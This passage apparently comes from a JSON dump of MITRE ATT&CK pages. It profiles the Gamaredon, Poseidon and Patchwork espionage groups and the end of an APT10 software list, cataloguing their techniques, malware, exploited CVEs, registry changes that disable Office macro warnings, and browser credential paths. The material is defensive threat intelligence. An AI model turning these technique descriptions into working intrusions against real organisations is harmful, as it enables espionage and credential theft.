Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0012 PoisonIvy [12][2] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S0194 PowerSploit [12] Access Token Manipulation, Account Discovery: Local Account, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Security Support Provider, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Domain Trust Discovery, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: DLL, Hijack Execution Flow: Path Interception by Search Order Hijacking, Input Capture: Keylogging, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Reflective Code Loading, Scheduled Task/Job: Scheduled Task, Screen Capture, Steal or Forge Kerberos Tickets: Kerberoasting, Unsecured Credentials: Credentials in Registry, Unsecured Credentials: Group Policy Preferences, Windows Management Instrumentation S0029 PsExec [12][7] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0006 pwdump [12] OS Credential Dumping: Security Account Manager S0262 QuasarRAT [1][8][14] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data from Local System, Encrypted Channel: Symmetric Cryptography, Hide Artifacts: Hidden Window, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Non-Application Layer Protocol, Non-Standard Port, Proxy, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, Unsecured Credentials: Credentials In Files, Video Capture S0153 RedLeaves [12][1] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Shortcut Modification, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hijack Execution Flow: DLL, Indicator Removal: File Deletion, Ingress Tool Transfer, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery S0159 SNUGRIDE [7] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Symmetric Cryptography S0627 SodaMaster [14] Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Native API, Obfuscated Files or Information, Process Discovery, Query Registry, System Information Discovery, System Owner/User Discovery, Virtualization/Sandbox Evasion: System Checks, Virtualization/Sandbox Evasion: Time Based Evasion S0275 UPPERCUT [10] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Ingress Tool Transfer, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery References United States District Court Southern District of New York (USDC SDNY) . (2018, December 17). United States of America v. Zhu Hua and Zhang Shilong. Retrieved April 17, 2019. US District Court Southern District of New York. (2018, December 17). United States v. Zhu Hua Indictment. Retrieved December 17, 2020. Miller-Osborn, J. and Grunzweig, J.. (2017, February 16). menuPass Returns with New Malware and New Attacks Against Japanese Academics and Organizations. Retrieved March 1, 2017. Crowdstrike. (2013, October 16). CrowdCasts Monthly: You Have an Adversary Problem. Retrieved November 17, 2024. FireEye. (2014). POISON IVY: Assessing Damage and Extracting Intelligence. Retrieved September 19, 2024. PwC and BAE Systems. (2017, April). Operation Cloud Hopper. Retrieved April 5, 2017. FireEye iSIGHT Intelligence. (2017, April 6). APT10 (MenuPass Group): New Tools, Global Campaign Latest Manifestation of Longstanding Threat. Retrieved June 29, 2017. Symantec. (2020, November 17). Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign. Retrieved December 17, 2020. Accenture Security. (2018, April 23). Hogfish Redleaves Campaign. Retrieved July 2, 2018. Matsuda, A., Muhammad I. (2018, September 13). APT10 Targeting Japanese Corporations Using Updated TTPs. Retrieved September 17, 2018. Counter Threat Unit Research Team . (2022, June 23). BRONZE STARLIGHT RANSOMWARE OPERATIONS USE HUI LOADER. Retrieved December 7, 2023. PwC and BAE Systems. (2017, April). Operation Cloud Hopper: Technical Annex. Retrieved April 13, 2017. Twi1ight. (2015, July 11). AD-Pentest-Script - wmiexec.vbs. Retrieved June 29, 2017. GREAT. (2021, March 30). APT10: sophisticated multi-layered loader Ecipekac discovered in A41APT campaign. Retrieved June 17, 2021. "
},
{
"id": 174,
"title": "Gamaredon Group, IRON TILDEN, Primitive Bear, ACTINIUM, Armageddon, Shuckworm, DEV-0157, Aqua Blizzard, Group G0047",
"path": "/groups/G0047/index.html",
"content": " Gamaredon Group Gamaredon Group is a suspected Russian cyber espionage threat group that has targeted military, NGO, judiciary, law enforcement, and non-profit organizations in Ukraine since at least 2013. The name Gamaredon Group comes from a misspelling of the word \"Armageddon\", which was detected in the adversary's early campaigns.[1][2][3][4][5] In November 2021, the Ukrainian government publicly attributed Gamaredon Group to Russia's Federal Security Service (FSB) Center 18.[6][5] ID: G0047 \u24d8 Associated Groups: IRON TILDEN, Primitive Bear, ACTINIUM, Armageddon, Shuckworm, DEV-0157, Aqua Blizzard Contributors: ESET; Trend Micro Incorporated; Yoshihiro Kori, NEC Corporation; Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India Version: 3.1 Created: 31 May 2017 Last Modified: 23 September 2024 Version Permalink Live Version Associated Group Descriptions Name Description IRON TILDEN [7] Primitive Bear [8] ACTINIUM [5] Armageddon [4] Shuckworm [4] DEV-0157 [5] Aqua Blizzard [9] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains Gamaredon Group has registered multiple domains to facilitate payload staging and C2.[5][8] .003 Acquire Infrastructure: Virtual Private Server Gamaredon Group has used VPS hosting providers for infrastructure outside of Russia.[10] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Gamaredon Group has used HTTP and HTTPS for C2 communications.[1][2][3][4][11][8][10] Enterprise T1119 Automated Collection Gamaredon Group has deployed scripts on compromised systems that automatically scan for interesting documents.[3] Enterprise T1020 Automated Exfiltration Gamaredon Group has used modules that automatically upload gathered documents to the C2 server.[3] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Gamaredon Group tools have registered Run keys in the registry to give malicious VBS files persistence.[2][3][11][10] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Gamaredon Group has used obfuscated PowerShell scripts for staging.[5] .003 Command and Scripting Interpreter: Windows Command Shell Gamaredon Group has used various batch scripts to establish C2 and download additional files. Gamaredon Group's backdoor malware has also been written to a batch file.[1][3][11][8] .005 Command and Scripting Interpreter: Visual Basic Gamaredon Group has embedded malicious macros in document templates, which executed VBScript. Gamaredon Group has also delivered Microsoft Outlook VBA projects with embedded macros.[2][3][11][5][7] Enterprise T1005 Data from Local System Gamaredon Group has collected files from infected systems and uploaded them to a C2 server.[3] Enterprise T1039 Data from Network Shared Drive Gamaredon Group malware has collected Microsoft Office documents from mapped network drives.[3] Enterprise T1025 Data from Removable Media A Gamaredon Group file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.[1][3] Enterprise T1001 Data Obfuscation Gamaredon Group has used obfuscated VBScripts with randomly generated variable names and concatenated strings.[10] Enterprise T1491 .001 Defacement: Internal Defacement Gamaredon Group has left taunting images and messages on the victims' desktops as proof of system access.[11] Enterprise T1140 Deobfuscate/Decode Files or Information Gamaredon Group tools decrypted additional payloads from the C2. Gamaredon Group has also decoded base64-encoded source code of a downloader.[2][3] Additionally, Gamaredon Group has decoded Telegram content to reveal the IP address for C2 communications.[10] Enterprise T1561 .001 Disk Wipe: Disk Content Wipe Gamaredon Group has used tools to delete files and folders from victims' desktops and profiles.[11] Enterprise T1568 Dynamic Resolution Gamaredon Group has incorporated dynamic DNS domains in its infrastructure.[8] .001 Fast Flux DNS Gamaredon Group has used fast flux DNS to mask their command and control channel behind rotating IP addresses.[10] Enterprise T1480 Execution Guardrails Gamaredon Group has used geoblocking to limit downloads of the malicious file to specific geographic locations.[10] Enterprise T1041 Exfiltration Over C2 Channel A Gamaredon Group file stealer can transfer collected files to a hardcoded C2 server.[1] Enterprise T1083 File and Directory Discovery Gamaredon Group macros can scan for Microsoft Word and Excel files to inject with additional malicious macros. Gamaredon Group has also used its backdoors to automatically list interesting files (such as Office documents) found on a system.[3][8] Enterprise T1564 .003 Hide Artifacts: Hidden Window Gamaredon Group has used hidcon to run batch files in a hidden console window.[8] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Gamaredon Group has delivered macros which can tamper with Microsoft Office security settings.[3] Enterprise T1070 .004 Indicator Removal: File Deletion Gamaredon Group tools can delete files used during an operation.[2][4][11] Enterprise T1105 Ingress Tool Transfer Gamaredon Group has downloaded additional malware and tools onto a compromised host.[1][2][3][5] For example, Gamaredon Group uses a backdoor script to retrieve and decode additional payloads once in victim environments.[10] Enterprise T1559 .001 Inter-Process Communication: Component Object Model Gamaredon Group malware can insert malicious macros into documents using a Microsoft.Office.Interop object.[3] Enterprise T1534 Internal Spearphishing Gamaredon Group has used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.[3] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Gamaredon Group has used legitimate process names to hide malware including svchosst.[8] Enterprise T1112 Modify Registry Gamaredon Group has removed security settings for VBA macro execution by changing registry values HKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\VBAWarnings and HKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\AccessVBOM.[3][11] Enterprise T1106 Native API Gamaredon Group malware has used CreateProcess to launch additional malicious components.[3] Enterprise T1027 Obfuscated Files or Information Gamaredon Group has delivered self-extracting 7z archive files within malicious document attachments.[3] .004 Compile After Delivery Gamaredon Group has compiled the source code for a downloader directly on the infected system using the built-in Microsoft.CSharp.CSharpCodeProvider class.[3] .010 Command Obfuscation Gamaredon Group has used obfuscated or encrypted scripts.[3][5] .016 Junk Code Insertion Gamaredon Group has obfuscated .NET executables by inserting junk code.[3] Enterprise T1588 .002 Obtain Capabilities: Tool Gamaredon Group has used various legitimate tools, such as mshta.exe and Reg, and services during operations.[10] Enterprise T1137 Office Application Startup Gamaredon Group has inserted malicious macros into existing documents, providing persistence when they are reopened. Gamaredon Group has loaded the group's previously delivered VBA project by relaunching Microsoft Outlook with the /altvba option, once the Application.Startup event is received.[3] Enterprise T1120 Peripheral Device Discovery Gamaredon Group tools have contained an application to check performance of USB flash drives. Gamaredon Group has also used malware to scan for removable drives.[1][3] Enterprise T1566 .001 Phishing: Spearphishing Attachment Gamaredon Group has delivered spearphishing emails with malicious attachments to targets.[2][3][11][5][8][7][10] Enterprise T1057 Process Discovery Gamaredon Group has used tools to enumerate processes on target hosts including Process Explorer.[4][8] Enterprise T1021 .005 Remote Services: VNC Gamaredon Group has used VNC tools, including UltraVNC, to remotely interact with compromised hosts.[4][5][8] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Gamaredon Group has created scheduled tasks to launch executables after a designated number of minutes have passed.[3][11][5][10] Enterprise T1113 Screen Capture Gamaredon Group's malware can take screenshots of the compromised computer every minute.[3] Enterprise T1608 .001 Stage Capabilities: Upload Malware Gamaredon Group has registered domains to stage payloads.[5][8] Enterprise T1218 .005 System Binary Proxy Execution: Mshta Gamaredon Group has used mshta.exe to execute malicious files.[4][10] .011 System Binary Proxy Execution: Rundll32 Gamaredon Group malware has used rundll32 to launch additional malicious components.[3] Enterprise T1082 System Information Discovery A Gamaredon Group file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.[1][2][11] Enterprise T1016 .001 System Network Configuration Discovery: Internet Connection Discovery Gamaredon Group has tested connectivity between a compromised machine and a C2 server using Ping with commands such as CSIDL_SYSTEM\\cmd.exe /c ping -n 1.[4] Enterprise T1033 System Owner/User Discovery A Gamaredon Group file stealer can gather the victim's username to send to a C2 server.[1] Enterprise T1080 Taint Shared Content Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives.[3] Enterprise T1221 Template Injection Gamaredon Group has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads.[12] Gamaredon Group can also inject malicious macros or remote templates into documents already present on compromised systems.[2][3][11][5][8][7] Enterprise T1204 .001 User Execution: Malicious Link Gamaredon Group has attempted to get users to click on a link pointing to a malicious HTML file leading to follow-on malicious content.[10] .002 User Execution: Malicious File Gamaredon Group has attempted to get users to click on Office attachments with malicious macros embedded.[2][3][4][11][5][8][7][10] Enterprise T1102 Web Service Gamaredon Group has used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.[3] .003 One-Way Communication Gamaredon Group has used Telegram Messenger content to discover the IP address for C2 communications.[10] Enterprise T1047 Windows Management Instrumentation Gamaredon Group has used WMI to execute scripts used for discovery and for determining the C2 IP address.[11][10] Software ID Name References Techniques S0097 Ping [4] Remote System Discovery S0685 PowerPunch [5] Command and Scripting Interpreter: PowerShell, Execution Guardrails: Environmental Keying, Ingress Tool Transfer, Obfuscated Files or Information: Command Obfuscation S0147 Pteranodon [1][4][5][8][7] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Native API, Obfuscated Files or Information: Dynamic API Resolution, Scheduled Task/Job: Scheduled Task, Screen Capture, System Binary Proxy Execution: Rundll32, System Binary Proxy Execution: Mshta, Virtualization/Sandbox Evasion S0686 QuietSieve [5] Application Layer Protocol: Web Protocols, Data from Local System, File and Directory Discovery, Hide Artifacts: Hidden Window, Ingress Tool Transfer, Network Share Discovery, Peripheral Device Discovery, Screen Capture, System Network Configuration Discovery: Internet Connection Discovery S0075 Reg Gamaredon Group has used Reg to add Run keys to the Registry.[10] Modify Registry, Query Registry, Unsecured Credentials: Credentials in Registry References Kasza, A. and Reichel, D. (2017, February 27). The Gamaredon Group Toolset Evolution. Retrieved March 1, 2017. Kakara, H., Maruyama, E. (2020, April 17). Gamaredon APT Group Use Covid-19 Lure in Campaigns. Retrieved May 19, 2020. Boutin, J. (2020, June 11). Gamaredon group grows its game. Retrieved June 16, 2020. Symantec. (2022, January 31). Shuckworm Continues Cyber-Espionage Attacks Against Ukraine. Retrieved February 17, 2022. Microsoft Threat Intelligence Center. (2022, February 4). ACTINIUM targets Ukrainian organizations. Retrieved February 18, 2022. Toulas, B. (2018, November 4). Ukraine links members of Gamaredon hacker group to Russian FSB. Retrieved April 15, 2022. Secureworks CTU. (n.d.). IRON TILDEN. Retrieved February 24, 2022. Unit 42. (2022, February 3). Russia\u2019s Gamaredon aka Primitive Bear APT Group Actively Targeting Ukraine. Retrieved February 21, 2022. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Unit 42. (2022, December 20). Russia\u2019s Trident Ursa (aka Gamaredon APT) Cyber Conflict Operations Unwavering Since Invasion of Ukraine. Retrieved September 12, 2024. CERT-EE. (2021, January 27). Gamaredon Infection: From Dropper to Entry. Retrieved February 17, 2022. Raggi, M. (2021, December 1). Injection is the New Black: Novel RTF Template Inject Technique Poised for Widespread Adoption Beyond APT Actors . Retrieved December 9, 2021. "
},
{
"id": 175,
"title": "Poseidon Group, Group G0033",
"path": "/groups/G0033/index.html",
"content": " Poseidon Group Poseidon Group is a Portuguese-speaking threat group that has been active since at least 2005. The group has a history of using information exfiltrated from victims to blackmail victim companies into contracting the Poseidon Group as a security firm. [1] ID: G0033 Version: 1.1 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account Poseidon Group searches for administrator accounts on both the local victim machine and the network.[1] .002 Account Discovery: Domain Account Poseidon Group searches for administrator accounts on both the local victim machine and the network.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell The Poseidon Group's Information Gathering Tool (IGT) includes PowerShell components.[1] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Poseidon Group tools attempt to spoof anti-virus processes as a means of self-defense.[1] Enterprise T1003 OS Credential Dumping Poseidon Group conducts credential dumping on victims, with a focus on obtaining credentials belonging to domain and database servers.[1] Enterprise T1057 Process Discovery After compromising a victim, Poseidon Group lists all running processes.[1] Enterprise T1049 System Network Connections Discovery Poseidon Group obtains and saves information about victim network interfaces and addresses.[1] Enterprise T1007 System Service Discovery After compromising a victim, Poseidon Group discovers all running services.[1] References Kaspersky Lab's Global Research and Analysis Team. (2016, February 9). Poseidon Group: a Targeted Attack Boutique specializing in global cyber-espionage. Retrieved March 16, 2016. "
},
{
"id": 176,
"title": "Patchwork, Hangover Group, Dropping Elephant, Chinastrats, MONSOON, Operation Hangover, Group G0040",
"path": "/groups/G0040/index.html",
"content": " Patchwork Patchwork is a cyber espionage group that was first observed in December 2015. While the group has not been definitively attributed, circumstantial evidence suggests the group may be a pro-Indian or Indian entity. Patchwork has been seen targeting industries related to diplomatic and government agencies. Much of the code used by this group was copied and pasted from online forums. Patchwork was also seen operating spearphishing campaigns targeting U.S. think tank groups in March and April of 2018.[1] [2][3][4] ID: G0040 \u24d8 Associated Groups: Hangover Group, Dropping Elephant, Chinastrats, MONSOON, Operation Hangover Version: 1.5 Created: 31 May 2017 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description Hangover Group Patchwork and the Hangover Group have both been referenced as aliases for the threat group associated with Operation Monsoon.[5][6][7] Dropping Elephant [2] [8] [5] [4] Chinastrats [8] MONSOON MONSOON is the name of an espionage campaign; we use it here to refer to the actor group behind the campaign. [7] [5] Operation Hangover It is believed that the actors behind Patchwork are the same actors behind Operation Hangover. [7] [9] Techniques Used Domain ID Name Use Enterprise T1548 .002 Abuse Elevation Control Mechanism: Bypass User Account Control Patchwork bypassed User Access Control (UAC).[1] Enterprise T1560 Archive Collected Data Patchwork encrypted the collected files' path with AES and then encoded them with base64.[3] Enterprise T1119 Automated Collection Patchwork developed a file stealer to search C:\\ and collect files with certain extensions. Patchwork also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server.[3] Enterprise T1197 BITS Jobs Patchwork has used BITS jobs to download malicious payloads.[6] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Patchwork has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.[1][3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Patchwork used PowerSploit to download payloads, run a reverse shell, and execute malware on the victim's machine.[1][3] .003 Command and Scripting Interpreter: Windows Command Shell Patchwork ran a reverse shell with Meterpreter.[1] Patchwork used JavaScript code and .SCT files on victim machines.[3][4] .005 Command and Scripting Interpreter: Visual Basic Patchwork used Visual Basic Scripts (VBS) on victim machines.[3][4] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers Patchwork dumped the login data database from \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data.[1] Enterprise T1132 .001 Data Encoding: Standard Encoding Patchwork used Base64 to encode C2 traffic.[1] Enterprise T1005 Data from Local System Patchwork collected and exfiltrated files from the infected system.[1] Enterprise T1074 .001 Data Staged: Local Data Staging Patchwork copied all targeted files to a directory called index that was eventually uploaded to the C&C server.[3] Enterprise T1587 .002 Develop Capabilities: Code Signing Certificates Patchwork has created self-signed certificates from fictitious and spoofed legitimate software companies that were later used to sign malware.[6] Enterprise T1189 Drive-by Compromise Patchwork has used watering holes to deliver files with exploits to initial victims.[2][4] Enterprise T1203 Exploitation for Client Execution Patchwork uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.[1][8][2][5][3][4][6] Enterprise T1083 File and Directory Discovery A Patchwork payload has searched all fixed drives on the victim for files matching a specified list of extensions.[1][3] Enterprise T1574 .001 Hijack Execution Flow: DLL A Patchwork .dll that contains BADNEWS is loaded and executed using DLL side-loading.[3] Enterprise T1070 .004 Indicator Removal: File Deletion Patchwork removed certain files and replaced them so they could not be retrieved.[3] Enterprise T1105 Ingress Tool Transfer Patchwork payloads download additional files from the C2 server.[8][3] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange Patchwork leveraged the DDE protocol to deliver their malware.[3] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Patchwork installed its payload in the startup programs folder as \"Baidu Software Update.\" The group also adds its second stage payload to the startup programs as \"Net Monitor.\"[1] They have also dropped QuasarRAT binaries as files named microsoft_network.exe and crome.exe.[4] Enterprise T1112 Modify Registry A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.[3] Enterprise T1027 .001 Obfuscated Files or Information: Binary Padding Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.[3] .002 Obfuscated Files or Information: Software Packing A Patchwork payload was packed with UPX.[8] .005 Obfuscated Files or Information: Indicator Removal from Tools Patchwork apparently altered NDiskMonitor samples by adding four bytes of random letters in a likely attempt to change the file hashes.[3] .010 Obfuscated Files or Information: Command Obfuscation Patchwork has obfuscated a script with Crypto Obfuscator.[3] Enterprise T1588 .002 Obtain Capabilities: Tool Patchwork has obtained and used open-source tools such as QuasarRAT.[4] Enterprise T1566 .001 Phishing: Spearphishing Attachment Patchwork has used spearphishing with an attachment to deliver files with exploits to initial victims.[1][8][3][4] .002 Phishing: Spearphishing Link Patchwork has used spearphishing with links to deliver files with exploits to initial victims.[2][3][6] Enterprise T1598 .003 Phishing for Information: Spearphishing Link Patchwork has used embedded image tags (known as web bugs) with unique, per-recipient tracking links in their emails for the purpose of identifying which recipients opened messages.[4] Enterprise T1055 .012 Process Injection: Process Hollowing A Patchwork payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Patchwork attempted to use RDP to move laterally.[1] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task A Patchwork file stealer can run a TaskScheduler DLL to add persistence.[3] Enterprise T1518 .001 Software Discovery: Security Software Discovery Patchwork scanned the \"Program Files\" directories for a directory with the string \"Total Security\" (the installation path of the \"360 Total Security\" antivirus tool).[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Patchwork has signed malware with self-signed certificates from fictitious and spoofed legitimate software companies.[6] Enterprise T1082 System Information Discovery Patchwork collected the victim computer name, OS version, and architecture type and sent the information to its C2 server. Patchwork also enumerated all available drives on the victim's machine.[1][3] Enterprise T1033 System Owner/User Discovery Patchwork collected the victim username and whether it was running as admin, then sent the information to its C2 server.[1][3] Enterprise T1204 .001 User Execution: Malicious Link Patchwork has used spearphishing with links to try to get users to click, download and open malicious files.[2][3][4][6] .002 User Execution: Malicious File Patchwork embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.[3][4] Enterprise T1102 .001 Web Service: Dead Drop Resolver Patchwork hides base64-encoded and encrypted C2 server locations in comments on legitimate websites.[8] Software ID Name References Techniques S0129 AutoIt backdoor [7] Abuse Elevation Control Mechanism: Bypass User Account Control, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, File and Directory Discovery S0475 BackConfig [6] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: Windows Command Shell, Deobfuscate/Decode Files or Information, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Native API, Obfuscated Files or Information: Command Obfuscation, Office Application Startup: Office Template Macros, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Information Discovery, User Execution: Malicious Link S0128 BADNEWS [7][3] Application Layer Protocol: Web Protocols, Automated Collection, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encoding, Data Encoding: Standard Encoding, Data from Local System, Data from Network Shared Drive, Data from Removable Media, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hijack Execution Flow: DLL, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Invalid Code Signature, Masquerading: Match Legitimate Resource Name or Location, Native API, Peripheral Device Discovery, Process Injection: Process Hollowing, Scheduled Task/Job: Scheduled Task, Screen Capture, Web Service: Dead Drop Resolver, Web Service: Bidirectional Communication S0272 NDiskMonitor [3] Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Ingress Tool Transfer, System Information Discovery, System Owner/User Discovery S0194 PowerSploit [1] Access Token Manipulation, Account Discovery: Local Account, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Security Support Provider, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Domain Trust Discovery, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: DLL, Hijack Execution Flow: Path Interception by Search Order Hijacking, Input Capture: Keylogging, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Reflective Code Loading, Scheduled Task/Job: Scheduled Task, Screen Capture, Steal or Forge Kerberos Tickets: Kerberoasting, Unsecured Credentials: Credentials in Registry, Unsecured Credentials: Group Policy Preferences, Windows Management Instrumentation S0262 QuasarRAT [3][4] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data from Local System, Encrypted Channel: Symmetric Cryptography, Hide Artifacts: Hidden Window, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Non-Application Layer Protocol, Non-Standard Port, Proxy, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, Unsecured Credentials: Credentials In Files, Video Capture S0131 TINYTYPHON [7] Automated Exfiltration, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, File and Directory Discovery, Obfuscated Files or Information: Encrypted/Encoded File S0130 Unknown Logger [7] Credentials from Password Stores: Credentials from Web Browsers, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Replication Through Removable Media, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery References Cymmetria. (2016). Unveiling Patchwork - The Copy-Paste APT. Retrieved November 17, 2024. Hamada, J.. (2016, July 25). Patchwork cyberespionage group expands targets from governments to wide range of industries. Retrieved August 17, 2016. Lunghi, D., et al. (2017, December). Untangling the Patchwork Cyberespionage Group. Retrieved July 10, 2018. Meltzer, M, et al. (2018, June 07). Patchwork APT Group Targets US Think Tanks. Retrieved July 16, 2018. Levene, B. et al.. (2018, March 7). Patchwork Continues to Deliver BADNEWS to the Indian Subcontinent. Retrieved March 31, 2018. Hinchliffe, A. and Falcone, R. (2020, May 11). Updated BackConfig Malware Targeting Government and Military Organizations in South Asia. Retrieved June 17, 2020. Settle, A., et al. (2016, August 8). MONSOON - Analysis Of An APT Campaign. Retrieved September 22, 2016. Kaspersky Lab's Global Research & Analysis Team. (2016, July 8). The Dropping Elephant \u2013 aggressive cyber-espionage in the Asian region. Retrieved August 3, 2016. Fagerland, S., et al. (2013, May). Operation Hangover: Unveiling an Indian Cyberattack Infrastructure. Retrieved November 17, 2024. "
},
{
"id": 177,
"title": "MoustachedBouncer, Group G1019",
"path": "/groups/G1019/index.html",
